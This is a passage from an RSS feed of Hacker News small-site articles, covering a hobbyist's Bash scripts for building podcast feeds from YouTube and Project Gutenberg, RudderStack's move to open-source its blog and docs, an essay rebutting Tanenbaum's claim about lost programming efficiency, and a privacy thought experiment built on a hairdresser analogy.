<div data-language="text"><pre><code>*/15 * * * * cd /home/pi/podsync/data &amp;&amp; git add . &amp;&amp; git commit -m "update feed" &amp;&amp; git push origin main</code></pre></div>
<p>Voila! My own podcast feed of YouTube videos, publicly available on the Internet. You can add my feed to Overcast (or your favorite podcast player) with its XML URL:</p>
<div data-language="text"><pre><code>https://rockswhat.github.io/listener/listen_laterz.xml</code></pre></div>
<h3>C'mon, you really achieved flow from <em>that</em>?</h3>
<p>No, not really, but <em>almost</em>. Tutorials, good ones, at least, are guided paths toward some goal, with micro-feedback and mini-frustrations along the way. And these things are well-suited to flow. They can lead you to flow.</p>
<p>In my case, this tutorial got my gears turning. Which now gets us into to the <code>creative computing</code> side of this article.</p>
<p>I think it's important to remind ourselves to have fun with our computers. To use them to make art, make music, create weird stuff, just because we can. There's so much on our computers and phones now thanks to the Internet that can warp our minds and render us into Lost Souls. We often forget the simple joys of computers of the past, back when they were bicycles for the mind, and used adorable floppy disks or CD-ROM drives for games and encyclopedias. I know there's so much "more" that we can do with computers, but we need to remember that they are here to work for us, and not the other way around.</p>
<p>As soon as I saw Overcast fill up with audio from my <code>Listen Laterz</code> YouTube playlist, I knew I needed to keep going, to see what else I could render from clay into podcast feeds.</p>
<h2>Creating a podcast audiobook from Project Gutenberg e-books</h2>
<p>Where else can we find a giant repository of open content on the Internet that also happens to be inconvenient to consume?</p>
<p>Hello, <a href="https://www.gutenberg.org/">Project Gutenberg</a>! </p>
<p>Project Gutenberg is just about the coolest --- and one of the most important -- things on the internet. The fact that it was <a href="https://en.wikipedia.org/wiki/Project_Gutenberg">started on the ARPANET in 1971</a> blows my mind. That is some creative, forward-thinking from its founder Michael S. Hart.</p>
<p>My idea here is simple: pick a public domain book, chop it up into chapters, convert the chapters to audio, and then generate an xml RSS feed.</p>
<p>I picked Mary Shelley's <a href="https://www.gutenberg.org/files/84/84-h/84-h.htm">Frankenstein</a>, because, why not? I already read it a few years ago during my October "Spooky Reads" habit, but I figured it's the perfect candidate for re-animation.</p>
<p>If you've clicked the link to the text on Project Gutenberg, you'll see it's a plaintext nightmare. I'm not ashamed to admit here that I manually just chopped it up into separate text files, rather than writing a script to somehow do this for me. Whatever, ok?</p>
<p>First let's make some files.</p>
<div data-language="bash"><pre><code><span>cd</span> pieces
<span>touch</span> intro.txt
<span>touch</span> letter-<span>{</span><span>1</span><span>..</span><span>4</span><span>}</span>.txt
<span>touch</span> chapter-<span>{</span><span>1</span><span>..</span><span>24</span><span>}</span>.txt
<span>touch</span> license.txt</code></pre></div>
<p>And then we copy-pasta.</p>
<p>Now that I've got my chapters (aka future podcast episodes) all set, we're ready to convert them to audio. What's the easiest way I can do that?</p>
<p>My "in-the-zone" brain suggests using the terminal's <code>say</code> command. I've used this command a few years ago in one of my earliest creative computing projects: a <a href="https://www.charlieharrington.com/terminal-man-live-in-nyc">live musical performance from a telepresence robot</a>).</p>
<p>Surely, I can write a neat little script to loop through my text files and <code>say</code> them into an <code>mp3</code>. Some Googling for <a href="https://stackoverflow.com/questions/16501663/macs-say-command-to-mp3">advice</a>, and I've soon got this Bash script going:</p>
<div data-language="bash"><pre><code><span>for</span> <span>i</span> <span>in</span> *.txt<span>;</span>
<span>do</span>
    <span>echo</span> <span>"processing <span>$i</span>..."</span><span>;</span>
    <span>name</span><span>=</span><span><span>$(</span><span>echo</span> <span>"<span>$i</span>"</span> <span>|</span> <span>cut</span> -f <span>1</span> -d <span>'.'</span><span>)</span></span>
    say -v Vicki -f <span>$i</span> -o aiff/<span>$name</span>.aiff
    lame -m m aiff/<span>$name</span>.aiff mp3/<span>$name</span>.mp3
    <span>rm</span> aiff/<span>$name</span>.aiff
<span>done</span></code></pre></div>
<p>And it works! Checkpoint reached! The <code>mp3</code> files are now sitting happily in their respective <code>/mp3</code> folder. I experience a fleeting moment of joy, and then immediately plunge into the next challenge: generating an XML feed.</p>
<p>My hack-y brain suggests another copy-pasta. Let's take the feed generated by the Podsync library in the section above, replace pieces of it with Bash variables, and then loop through my text files to jam in the values I want.</p>
<p>More googling ensures, including learning a bit more about <a href="https://en.wikipedia.org/wiki/Here_document#:~:text=In%20computing%2C%20a%20here%20document,it%20were%20a%20separate%20file.">heredocs</a>, and I've eventually got this script:</p>
<div data-language="bash"><pre><code><span>#!/bin/bash</span>


<span>PODCAST_TITLE</span><span>=</span><span>"Castellan - Frankenstein"</span>
<span>PODCAST_AUTHOR</span><span>=</span><span>"Castellan"</span>
<span>CATEGORY</span><span>=</span><span>"Technology"</span>
<span>GENERATOR</span><span>=</span><span>"Castellan"</span>
<span>LINK</span><span>=</span><span>"https://whatrocks.github.io/castellan/"</span>
<span>IMG</span><span>=</span><span>"https://whatrocks.github.io/castellan/showart.jpg"</span>


<span>CURRENT_DATE</span><span>=</span><span><span>$(</span><span>date</span> -R<span>)</span></span>


<span>EPS</span><span>=</span><span>(</span>
  intro
  letter-1
  letter-2
  letter-3
  letter-4
  chapter-1
  chapter-2
  chapter-4
  chapter-3
  chapter-5
  chapter-6
  chapter-7
  chapter-8
  chapter-9
  chapter-10
  chapter-11
  chapter-12
  chapter-13
  chapter-14
  chapter-15
  chapter-16
  chapter-17
  chapter-18
  chapter-19
  chapter-20
  chapter-21
  chapter-22
  chapter-23
  chapter-24
  license
<span>)</span>

<span>read</span> -d <span>''</span> feed <span>&lt;&lt;</span> <span>EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd"&gt;
  &lt;channel&gt;
    &lt;title&gt;<span>$PODCAST_TITLE</span>&lt;/title&gt;
    &lt;link&gt;<span>$LINK</span>&lt;/link&gt;
    &lt;description&gt;<span>$PODCAST_TITLE</span> (<span>$CURRENT_DATE</span>)&lt;/description&gt;
    &lt;category&gt;<span>$CATEGORY</span>&lt;/category&gt;
    &lt;generator&gt;<span>$GENERATOR</span>&lt;/generator&gt;
    &lt;language&gt;en-us&lt;/language&gt;
    &lt;lastBuildDate&gt;<span>$CURRENT_DATE</span>&lt;/lastBuildDate&gt;
    &lt;pubDate&gt;<span>$CURRENT_DATE</span>&lt;/pubDate&gt;
    &lt;itunes:author&gt;<span>$PODCAST_AUTHOR</span>&lt;/itunes:author&gt;
    &lt;itunes:subtitle&gt;<span>$PODCAST_TITLE</span>&lt;/itunes:subtitle&gt;
    &lt;itunes:summary&gt;&lt;![CDATA[<span>$PODCAST_TITLE</span> (<span>$CURRENT_DATE</span>)]]&gt;&lt;/itunes:summary&gt;
    &lt;itunes:image href="<span>$IMG</span>"/&gt;
    &lt;itunes:explicit&gt;no&lt;/itunes:explicit&gt;
    &lt;itunes:category text="<span>$CATEGORY</span>"&gt;&lt;/itunes:category&gt;
EOF</span>

<span>echo</span> <span>$feed</span>

<span>COUNT</span><span>=</span><span>1</span>
<span>for</span> <span>episode</span> <span>in</span> <span>${EPS<span>[</span>@<span>]</span>}</span><span>;</span>‚Ä¶</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.charlieharrington.com/flow-and-creative-computing">https://www.charlieharrington.com/flow-and-creative-computing</a></em></p>]]>
            </description>
            <link>https://www.charlieharrington.com/flow-and-creative-computing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792367</guid>
            <pubDate>Fri, 15 Jan 2021 16:04:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Open Source Story ‚Äì Open Sourcing RudderStack Blog and Docs]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25792282">thread link</a>) | @veenap
<br/>
January 15, 2021 | https://rudderstack.com/blog/the-open-source-story-open-sourcing-rudderstack-blog-and-docs | <a href="https://web.archive.org/web/*/https://rudderstack.com/blog/the-open-source-story-open-sourcing-rudderstack-blog-and-docs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><figure><div></div></figure><section><div itemprop="articleBody"><h2>It‚Äôs all About Open Source</h2>
<p>Open source is a component of almost all software development that takes place today. If you look back, the influence has been potent. For example, the main reason Python became the language most-suited for machine learning is the open-source contributors. In fact, because of the enormous size of the open-source community that is tirelessly developing Python, <a href="https://www.wired.com/2015/11/google-open-sources-its-artificial-intelligence-engine/">Google open-sourced TensorFlow</a>. </p>
<p>Joe Worrall, Director of Open Source and Developer Advocacy at New Relic, <a href="https://blog.newrelic.com/product-news/contributor-centric-systems/">describes</a> the dynamics behind the power of building contributor-centric systems: </p>
<p><em>‚ÄúContributors don‚Äôt give to the cause. They are a part of it.‚Äù</em></p>
<p>RudderStack is an open-source customer data pipeline tool for developers. Being open source is a tag we wear with pride, so much so that we recently partnered with GitHub for <a href="https://github.com/sponsors">GitHub Sponsors for Companies</a>. We value the developer community that works hard to build and support open source projects. In a recent <a href="https://rudderstack.com/blog/RudderStack-gitHub-sponsors-making-open-source-more-sustainable-for-developers">blog</a>, we explained why RudderStack directly compensates developers for their contributions to our project. This post discusses why and how we open-sourced our content and took the next step in our open source journey.</p>
<h2>Why we Open Sourced our Blog and Docs</h2>
<p>Said simply, bringing more voices to the table increases our content‚Äôs quality and value, both in thought leadership and our technical documentation. </p>
<p>We want developers to share their ideas, thoughts, and findings while working with RudderStack, customer data, and data in general. We want to learn about the data stacks you are building, problems you are solving, and solutions you are creating. Blogs, tutorials, and even case studies are great ways to share that knowledge.  In short, we want you to contribute!</p>
<h2>Our Previous Blog Infrastructure</h2>
<p>We used <a href="https://wordpress.org/">WordPress</a> for our blog before we decided to open source it. WordPress itself is open source and is fantastic for its simplicity, SEO settings, advertising, and flexible themes. In fact, WordPress is the <em>numero uno</em> choice of bloggers for hosting their own websites as per <a href="https://www.techradar.com/in/best/cms">Tech Radar</a>. </p>
<p>From a site performance and version-control standpoint, though, it‚Äôs less straightforward than more modern tooling. Also, to allow contribution, you have to use some sort of plugin (like <a href="https://wordpress.org/plugins/user-submitted-posts/">User Submitted Posts</a>), a less-than-ideal experience for developers, and opens up your dashboard to outside users. </p>
<p>All-in-all, building an open-source, version-controlled blog that enables developers to create content and submit it via pull requests easily is a cumbersome and tricky process on WordPress.</p>
<h2>Open Source Frameworks Options for our Blog</h2>
<p>When we decided to open-source our blog and docs, we were spoilt for choices. Today there are multiple well-supported and fully-featured frameworks for open-source content creation. Some of the options that we considered were  <a href="https://ghost.org/features/">Ghost</a>, <a href="https://jekyllrb.com/">Jekyll</a>, <a href="https://gohugo.io/">Hugo</a>, <a href="https://nanoc.ws/">Nanoc</a>, and <a href="https://www.gatsbyjs.com/">Gatsby</a>. There are even more frameworks beyond these,  and each tool has its pros and cons. Which one do we recommend? Well, we don‚Äôt. The best tool for you is the one that fulfills your requirements.</p>
<h2>Why we Picked Gatsby</h2>
<p>We picked <a href="https://www.gatsbyjs.com/docs">Gatsby.js</a> as the framework for open-sourcing our content. While making the decision, Jekyll was a strong contender, but the final choice for us was Gatsby. </p>
<p>Here‚Äôs why we chose it:</p>
<ul>
<li>Writing content in Gatsby is simple and developer-friendly. It uses Markdown for formatting. It just takes two plugins to set it up (<code>gatsby-source-filesystem</code> and <code>gatsby-transformer-remark</code>). </li>
<li>Integration with GitHub Pages is simple, which was a priority for us.</li>
<li>Gatsby has a rich library of plugins, which you can use for extending and introducing additional functionalities (in fact, through GitHub Sponsors, we had a <a href="https://www.gatsbyjs.com/plugins/gatsby-plugin-rudderstack/">RudderStack plugin</a> made!)</li>
<li>Implementing Gatsby is relatively straightforward in most cases. You can check their <a href="https://www.gatsbyjs.com/docs/quick-start/">docs</a> to see how to get started with Gatsby.js.</li>
<li>Gatsby is super high performance, meaning speedy page load times.</li>
<li>Gatsby allows creating an interactive experience for the readers.</li>
<li>A vast modern web development community contributes to it.</li>
</ul>
<h2>Wait, What About the Docs?</h2>
<p>Our docs still run on Gitbook but are now open-sourced so that others can contribute. We are currently exploring other open-source frameworks like Slate that will give us more flexibility and better telemetry. We will write another post when we make a decision and complete the migration. </p>
<h2>We are Open Source now!</h2>
<p>So, the RudderStack Blog and Docs are now open source. We‚Äôre excited about contributions from the RudderStack community and beyond. </p>
<p>In fact, developers have already started contributing to our documentation. Recently, <a href="https://github.com/benedikt">Benedikt</a> from the <a href="https://userlist.com/">Userlist</a> team created the <a href="https://docs.rudderstack.com/destinations/userlist">docs for the Userlist destination</a> for RudderStack (see the pull request <a href="https://github.com/rudderlabs/rudderstack-docs/pull/12">here</a>). They also built the Userlist integration, submitted a pull request, and it is now live on our platform!  This is the beauty of open source!</p>
<h2>How to Contribute</h2>
<p>Contributing to RudderStack is simple!</p>
<ul>
<li>Visit <a href="https://github.com/rudderlabs/rudder-blog/tree/main/content/blog">RudderStack Blog</a> to contribute to blogs or <a href="https://github.com/rudderlabs/rudderstack-docs">RudderStack Docs</a> for docs..</li>
<li>If you wish to add a new blog/doc, click on <strong>Create new file</strong> or <strong>Upload files</strong> as shown in the following diagram.</li>
<li>Also, to suggest changes to an existing file, go to the file and select Edit this file.</li>
<li>Once you make the changes, Click on <strong>Propose changes</strong>.</li>
</ul>
<figure><span>
      <a href="https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/541fe/opensourcingbloganddocs.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="opensourcingbloganddocs" title="opensourcingbloganddocs" src="https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/f058b/opensourcingbloganddocs.png" srcset="https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/c26ae/opensourcingbloganddocs.png 158w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/6bdcf/opensourcingbloganddocs.png 315w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/f058b/opensourcingbloganddocs.png 630w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/40601/opensourcingbloganddocs.png 945w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/78612/opensourcingbloganddocs.png 1260w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/541fe/opensourcingbloganddocs.png 1654w" sizes="(max-width: 630px) 100vw, 630px" loading="lazy">
  </a>
    </span><figcaption>How to contribute to RudderStack blog and Docs</figcaption></figure>
<ul>
<li>Once your Pull Request is created, we will review the changes you‚Äôve made.</li>
<li>If everything looks okay, our team will accept it (or edit to make it reader friendly), and <a href="https://www.merriam-webster.com/dictionary/voil%C3%A0">Voil√†</a>! Your changes will reflect on the pages.</li>
</ul>
<p>Start building a better, warehouse-first CDP that delivers complete, unified data to every part of your marketing and analytics stack by signing up for <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a> today. <a href="https://rudderstack.com/blog/">Subscribe to our blogs</a>, join <a href="https://resources.rudderstack.com/join-rudderstack-slack">Slack</a> to chat with our team, check out our open-source repos on <a href="https://github.com/rudderlabs">GitHub</a>, and follow us on our socials: <a href="https://twitter.com/RudderStack">Twitter</a>, <a href="https://www.linkedin.com/company/rudderlabs/">LinkedIn</a>, <a href="http://dev.to/">dev.to</a>, <a href="https://rudderstack.medium.com/">Medium</a>, <a href="https://www.youtube.com/channel/UCgV-B77bV_-LOmKYHw8jvBw">YouTube</a>. Don‚Äôt miss out on any updates. <a href="https://rudderstack.com/blog/">Subscribe</a> to our blogs today!</p></div></section></article></div>]]>
            </description>
            <link>https://rudderstack.com/blog/the-open-source-story-open-sourcing-rudderstack-blog-and-docs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792282</guid>
            <pubDate>Fri, 15 Jan 2021 15:57:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Small and Efficient (2020)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791723">thread link</a>) | @q-big
<br/>
January 15, 2021 | https://datagubbe.se/small_efficient/ | <a href="https://web.archive.org/web/*/https://datagubbe.se/small_efficient/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p><i>Spring 2020</i></p>

<p>
Shortly before the end of 2019 I stumbled across an excerpt from "Modern Operating Systems" by Andrew S. Tanenbaum, a well-known Computer Science professor and the original author of the MINIX operating system.
</p>

<p>
In it, he writes that <i>"[MULTICS] was designed to support hundreds of users on a machine only slightly more powerful than an Intel 386 (...) This is not quite as crazy as it sounds, since in those days people knew how to write small, efficient programs, a skill that has subsequently been completely lost."</i>
</p>

<p>
The quote has rattled around in my head since then. It's somewhat tongue-in-cheek, but the sentiment is clear. It wasn't the first time I'd heard something like it, and Tanenbaum isn't the first nor the last to make such a claim - I myself am surely guilty of saying something similar at some point in time. Nevertheless, it stuck with me because it's both factually incorrect and very insulting to a lot of young programmers.
</p>

<p>
In Tanenbaum's defense, I understand where he's coming from. It's an easy mistake to make, common among us grumpy old gits. Looking at modern software munching memory and disk space by the gigabyte, it's easy to reminisce about simpler times when 640 or even 64 kilobytes of RAM were enough for everyone.
</p>

<p>
It's also a very common misconception. The sentiment is just as applicable to trades other than programming and likely crops up everywhere with some regularity. Any craft that has developed over time, be it software development, cooking, tailoring, fishing or masonry, will have a group of elders scoffing at new-fangled shortcuts and technological advancements. Such modern folly is made out to be something that sullies the inherent soul of the workmanship and lessens its value. The fact that new skills might have to be learned to master this new technology is seldom taken into account when making such statements.
</p>

<p>
I'm certainly not advocating progress simply for the sake of progress. Doing so often leads to confusing the two very different concepts of <i>change</i> and <i>improvement</i>, a distinction sadly apparent to some only after it has been demonstrated empirically. It's also always good with a bit of historical knowledge, if nothing else because it's humbling to learn about the giants upon whose shoulders we stand.
</p>

<p>
The desire for faster computers with more memory, however, is a desire for real improvement. It means that not only can we do more of the same with our machines, but also new things that seemed impossible mere decades ago. This is important, because herein lies the core of my reasoning.
</p>

<h3>Elder Usability</h3>

<p>
Today, computers are ubiquitous. Not just as laptops or desktops in homes and offices, but as tablets, smartphones, wristwatches and entertainment centers. In fact, pretty much anything except food can be bought in some computerized form today: vacuum cleaners, light bulbs, mirrors, books, cars - even doorbells. We are at a point where we can have computers do our bidding by speaking to them in everyday phrases and be reasonably well understood.
</p>

<p>
At the time when MULTICS was conceptually conceived, a computer was, with few exceptions, a great big machine that easily filled a large room. One that had the performance of a 386 chip was truly top of the line, cutting edge stuff. In fact it was so advanced and expensive that MULTICS itself was accused of being a resource hog, which was one of the reasons it never became very popular.
</p>

<p>
The methods used to get an ancient mainframe like that to perform computations were, put simply, extremely crude. Complex program code had to be written in clunky languages like FORTRAN, stored on massive amounts of punched paper cards and mechanically read into the computer's small and expensive memory. If one was lucky and the program ran without bugs, all you could do was to wait. Even relatively simple tasks that a layperson has been able to solve in the blink of an eye using a spreadsheet program for the last few decades, could take minutes or even hours to carry out - after the computer had been prepped and the program loaded, of course.
</p>

<p>
That doesn't mean the layperson with the spreadsheet program is a skilled programmer, but it also doesn't mean there are no skilled programmers today. It's simply an example of where increased program complexity also increases the usefulness and usability of a computer. For a layperson to perform such a task without the knowledge of FORTRAN and card punches, such complexity is necessary. This, in turn, increases the overall footprint of software.
</p>

<p>
MULTICS and (perhaps to a greater extent) its more successful spin-off, UNIX, were certainly wonders of software engineering. They did truly provide multi-user, multi-tasking environments for a number of generic applications to run in and they did so on very limited hardware. At the same time, there was nothing about those systems that someone could get to grips with after goofing around with a mouse and GUI for a few hours. Everything was based on cryptic commands you had to learn by heart, controlled with even more cryptic parameters you also had to learn by heart.
</p>

<p>
Once learned, those commands could then be used to start a program. Not that you'd really know if it was even running, because most of the programs made no significant difference on the computer's output. Often they just produced a blank screen or an empty line on an teletype and were as cryptic to operate as the commands for starting them. Even a program for performing simple arithmetic could be confusing to a first time user, who would surely want to write "1 + 2" and press enter for a result, but may have had to learn about stacks and RPN and input "1 2 + p" to carry out a basic integer addition.
</p>

<p>
RPN, Reverse Polish Notation, was a great invention because it reduced memory usage at a time when memory was stupendously expensive - exactly the kind of "small and efficient" code Tanenbaum claims is a lost art. It is also an excellent example of why less small and less efficient programming might produce a more pleasant experience for the end user, who can then focus more on the actual problem at hand than on how to think like the computer used to solve it. Today we expect that even the cheapest of phones come with a program resembling a pocket calculator for performing such calculations, requiring little more prerequisite knowledge than a few grade school math lessons.
</p>

<h3>Pointing and Clicking</h3>

<p>
At the time of MULTICS, using computers meant dealing with crude and complex user interfaces, long execution times and results most often presented with simple text printed on paper. The code was small and efficient because the machines offered programmers no other choice, but that code - as brilliant as it was - resulted in a primitive, time consuming and often frustrating user experience. This was what users expected, even if it meant learning RPN for calculations and at least one complex, declarative programming syntax to format even the simplest of documents.
</p>

<p>
Today, we use graphical interfaces for most things. There are still people, like me, who enjoy the power and flexibility offered by a command line once you've learned how to operate it. For others, such as beginner users or the vast majority of people who simply consider their computer to be any other home appliance, the GUI is much more efficient. There's no need to think like a CPU, to memorize cumbersome commands and keep intricate data structures such as directory trees and concepts like logical operators in your head.
</p>

<p>
The GUI comes as at a cost: These easy to use interfaces add complexity to program code, requiring more memory and faster processors. Even early graphical interfaces required considerable power and, though instantly recognizable by a modern-day user, they lacked both speed, finesse and luxuries such as color. It has been a long, meandering journey to end up where we are today.
</p>

<h3>To type a ‚Ç¨uro sign</h3>

<p>
Take something as ostensibly simple as text rendering. It was a big step up in usability when computers moved from DIP switch panels and blinkenlights to interfacing over teletypes: plain text commands could be entered and yielded plain text results. It was all 7-bit ASCII (or an equivalent) of course, not taking up much space and not requiring a lot of computational resources. The teletype dictated what characters most of the software written should be able to handle, keeping things small and efficient.
</p>

<p>
Moving forward a bit, teletypes were replaced by CRT terminals. In the beginning, they merely emulated their mechanical predecessors but software that utilized the fixed width and height of a screen and their faster refresh rate soon materialized. Full screen editors, for example, were a step up for the end users, giving them contextual information about the line they were currently editing by displaying the surrounding lines on screen at all times.
</p>

<p>
Of course, manufacturers wanted to sell their computers and terminals to markets other than English speaking ones, which made 7-bit character space a bit crowded. Adding an extra bit of information doubled the number of characters and, in effect, opened up the central European market in earnest. Things like umlauts, circumflexes and accents are taken for granted today but to handle them, we had to increase memory and bandwidth usage.
</p>

<p>
Asian languages such as Mandarin and Japanese, using complex signs for whole words, and a whole host of other alphabets such as Farsi and Tagalog, eventually led to the creation of Unicode and UTF, in which a single character now may take up many times the space of one in 7-bit ASCII. This adds a lot of complexity in tools written for handling simple text files. It also adds a lot of complexity in displaying such text. At the time when 7-bit ASCII ruled, a terminal had a fixed font embedded in hardware and there were no other choices. If you were lucky, it could display bold text in some fashion, but ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://datagubbe.se/small_efficient/">https://datagubbe.se/small_efficient/</a></em></p>]]>
            </description>
            <link>https://datagubbe.se/small_efficient/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791723</guid>
            <pubDate>Fri, 15 Jan 2021 15:03:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hairdresser Analogy]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25791684">thread link</a>) | @jessems
<br/>
January 15, 2021 | https://jessems.com/hairdresser-analogy | <a href="https://web.archive.org/web/*/https://jessems.com/hairdresser-analogy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p><span>
      <a href="https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/fcdb9/hairdresser-analogy.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Rummaging Hairdresser" title="The Rummaging Hairdresser" src="https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/af659/hairdresser-analogy.jpg" srcset="https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/8356d/hairdresser-analogy.jpg 259w,https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/bc760/hairdresser-analogy.jpg 518w,https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/af659/hairdresser-analogy.jpg 1035w,https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/51eb8/hairdresser-analogy.jpg 1553w,https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/fcdb9/hairdresser-analogy.jpg 1737w" sizes="(max-width: 1035px) 100vw, 1035px" loading="lazy">
  </a>
    </span></p><p><em>This is a thought exercise to help explore what is okay (and what isn't) when it comes to the exchange between personal information and the provision of a personalised service.</em></p><p>Imagine you've moved to a new city and you're in need of a hairdresser to do your hair every other week. Perhaps you try out one or two different ones first, or perhaps you go with a friend's recommendation. Either way, after a short while you've settled on a hair dresser you're happy with. They're professional, they treat you well, they remember your name and you build up a relationship with them over time.</p><p>As you visit this hairdresser more often, they gain more experience with your specific hair type, your preferred hair style and your preferred hair products. Perhaps the hairdresser, knowing that you have particularly thick hair, and remembering that you dislike the way it curls around your ears when it gets too long, ensures a shorter cut in those areas by default. Or, perhaps remembering that you‚Äôre most happy when your hair has a bouncy look to it, they introduce you to a specific type of wax that helps you achieve that type of effect.</p><p>There's a direct relationship here between (1) how much the hairdresser knows about you, and remembers about you, and (2) the quality of the service you receive. The more the hairdresser knows about you, the better the service they can provide. It's convenient to you when you don't have to explain what you want every time you visit. It's valuable to you when your hairdresser knows so much about your hair and your preferences that they're able to suggest things to you you didn't even know you wanted. It can also be nice if they remember the names of your children, or if they ask about that issue you were grappling with at work the last time you stopped by.</p><p>Now imagine it‚Äôs time for your regular haircut, so you visit your trusted hairdresser. You sit down in the salon chair, as you've been doing every other week and they tell you they'll be "right with you." As you look into the mirror in front of you, you see them in the reflection walking up to the coat hanger where you've hung up your coat. Having arrived at your coat they start to insert their hand into your coat's pockets one by one. For each pocket they extract its contents (your wallet, your mobile phone, your keys <sup id="fnref-1"><a href="#fn-1">1</a></sup>) and examine each carefully, before placing them back. After having made their way through your entire coat, they return to your chair to finally tend to your needs: "So, what will it be today? The usual?"</p><p>In this real-life scenario most people would, at the very least, be astonished but hopefully also a bit angry. You might want to say: "Hey! What are you doing in my coat?" Now imagine their response being "Oh, that's just a new policy we've introduced which helps us improve our service to you. You see," they continue, "as I was examining the items in your coat, I noticed a car key with an Audi logo. One of my friends happens to be an Audi mechanic. I can put you in touch with him, if you're interested, and they can help you if your car ever breaks down. I also made note of the contacts in your phone, and if one of them ever comes in for a haircut, and I'll be sure to give them a special treatment, on the house." <sup id="fnref-2"><a href="#fn-2">2</a></sup></p><p>Would this explanation suffice for you? Would it be sufficient justification for rummaging <sup id="fnref-3"><a href="#fn-3">3</a></sup> through your coat? Would it quench the anger you felt above?</p><p>I would hope that to most people this justification sounds silly, perhaps even patronizing and certainly not an adequate justification for rummaging through your belongings. Whether or not the hairdresser's rummaging improves his service to you doesn't matter.</p><p>The only thing that matters here is that your hairdresser has no business rummaging through your fucking coat <sup id="fnref-4"><a href="#fn-4">4</a></sup>.</p><p>Please remember how this makes you feel. We're going to change some variables in the story and see what happens.</p><p>Let's go back to our imagined scenario. You feel offended that your hairdresser went through your coat and you say: "Hey man, I didn't agree to that!"</p><p>"Oh, I'm sorry" he replies "I didn't mean to offend you. But actually, you did consent to this new policy. You see, there's a sign at the door which says:</p><p><em>‚ÄòAnybody that walks through this door consents to their coat being rummaged through for purposes of improving our service to you.'</em></p><p>So by walking through the door, you've actually given your consent." <sup id="fnref-5"><a href="#fn-5">5</a></sup>.</p><p>Let‚Äôs ignore, for the sake of brevity, the issue of whether walking through a door could reasonably constitute giving consent. Imagine instead that you don't catch the hairdresser rummaging through your coat, but instead they tell you their assistant will examine all your belongings while you lie back, close your eyes and have your hair washed by them with lavender shampoo.</p><p>Try to notice within yourself: Do you feel less outrage if you're not witnessing the act of someone rummaging through your coat, but you know it's happening? For me it makes it slightly more difficult to "find" the outrage inside of myself. Since I‚Äôm not witnessing the act with my own eyes, I need to first imagine it happening before I'm able to perceive any level of outrage. The outrage is still there, but it's become a bit harder to access. It's become a bit more distant if you will.</p><p>Let's continue to change variables. Let's imagine there's no assistant but the hairdresser has installed a high tech camera in the room which, without touching your coat and within a microsecond, is able to scan your coat and analyze all its contents. In doing so, it is able to extract the same information the hairdresser and their assistant were able to do when they were doing it themselves. Imagine this takes place in a split second and it happened as you sat down.</p><p>Do you feel angry about what just happened? Do you feel less outrage than before now that the violation is invisible to you, instantaneous and done through an inanimate object?</p><p>For me, I feel outrage, but it's become less visceral and more intellectual. It's as if I only feel outrage because I‚Äôm able to follow a sequence of logical steps to arrive at the conclusion that the outcomes of the camera scan and the physical rummaging are one and the same. That said, without the image of a person with their hands in my coat (imagined or not), it‚Äôs more difficult to feel outraged. It‚Äôs also harder to feel outraged when the violation is committed by an inanimate object. For one, I'm not sure who to get angry at, and I somehow feel less violated when it's a machine or an algorithm committing the act.</p><p>Now go one step further and imagine it's not even a high-tech camera doing the scanning, but some unknown technology which you cannot see and do not understand. It‚Äôs not located anywhere you can point at, it‚Äôs just ‚Äúthere‚Äù somewhere in the hairdresser‚Äôs salon with you as it scans the contents of your jacket.</p><p>Are you able to find any outrage at all this time? </p><p>I can still find it, but it‚Äôs even more difficult to find than before. With the camera at least I had something I could focus my anger on (and could potentially smash). Without any identifiable person or object committing these acts, the act itself seems to slowly lose the property of being something one could potentially object to.</p><p>My outrage seems to require at a minimum a crime and a perpetrator. I struggle to find those here. Only by invoking the analog equivalent from before and by imagining an actual person committing these acts do I feel outrage. But equating this last scenario to the analog equivalent feels slightly awkward; an oversimplification. As a result, the outrage doesn‚Äôt transfer fully from one scenario to the other.</p><p>By changing the process through which the information was extracted while keeping the outcome (the extracted data) the same, my outrage circuitry has almost entirely been bypassed. This was achieved by making the scenario more abstract, instantaneous, invisible and by making the actor an inanimate, unidentifiable piece of technology.</p><p>Now, one final step. Imagine we hadn't started with the analog example of the rummaging hairdresser and the emotional memory of how that made you feel. 